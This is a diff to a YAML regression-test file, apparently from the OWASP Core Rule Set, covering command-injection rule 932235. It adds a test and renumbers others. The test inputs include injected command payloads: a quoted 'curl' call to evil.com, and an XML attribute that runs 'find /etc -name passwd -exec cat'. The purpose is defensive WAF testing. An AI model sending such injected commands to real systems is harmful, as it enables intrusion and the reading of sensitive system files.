@@ -969,20 +969,19 @@ tests:
           log:
             expect_ids: [932235]
   - test_id: 55
-    desc: "Block execution of curl with quotes evasion"
+    desc: 'GHSA: 932235 payload via XML attribute injection (verifies XML://@* coverage)'
     stages:
       - input:
           dest_addr: 127.0.0.1
-          headers:
-            Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
-            Host: localhost
-            User-Agent: "OWASP CRS test agent"
           method: POST
           port: 80
-          uri: "/post"
-          version: HTTP/1.1
-          data: |
-            code=;'curl'%20http://evil.com
+          headers:
+            User-Agent: 'OWASP CRS test agent'
+            Host: 'localhost'
+            Content-Type: 'application/xml'
+          uri: '/post'
+          data: '<?xml version="1.0"?><root><a probe="code=;find /etc -name passwd -exec cat &#x7B;&#x7D; +&#10;"></a></root>'
+          version: 'HTTP/1.1'
         output:
           log:
             expect_ids: [932235]
@@ -1000,11 +999,29 @@ tests:
           uri: "/post"
           version: HTTP/1.1
           data: |
-            code=;%22curl%22%20http://evil.com
+            code=;'curl'%20http://evil.com
         output:
           log:
             expect_ids: [932235]
   - test_id: 57
+    desc: "Block execution of curl with quotes evasion"
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+            Host: localhost
+            User-Agent: "OWASP CRS test agent"
+          method: POST
+          port: 80
+          uri: "/post"
+          version: HTTP/1.1
+          data: |
+            code=;%22curl%22%20http://evil.com
+        output:
+          log:
+            expect_ids: [932235]
+  - test_id: 58
     desc: Don't match on non-command word quotes
     stages:
       - input:
@@ -1020,7 +1037,7 @@ tests:
         output:
           log:
             no_expect_ids: [932235]
-  - test_id: 58
+  - test_id: 59
     desc: Don't match on non-command word quotes
     stages:
       - input:
@@ -1036,7 +1053,7 @@ tests:
         output:
           log:
             no_expect_ids: [932235]
-  - test_id: 59
+  - test_id: 60
     desc: |
       Don't match on natural english sentences in quotes
       ;"The quick brown fox jumped over the lazy dog"
@@ -1054,7 +1071,7 @@ tests:
         output:
           log:
             no_expect_ids: [932235]
-  - test_id: 60
+  - test_id: 61
     desc: |
       Don't match on natural english sentences in quotes
       ;"The quick brown fox jumped over the lazy dog"
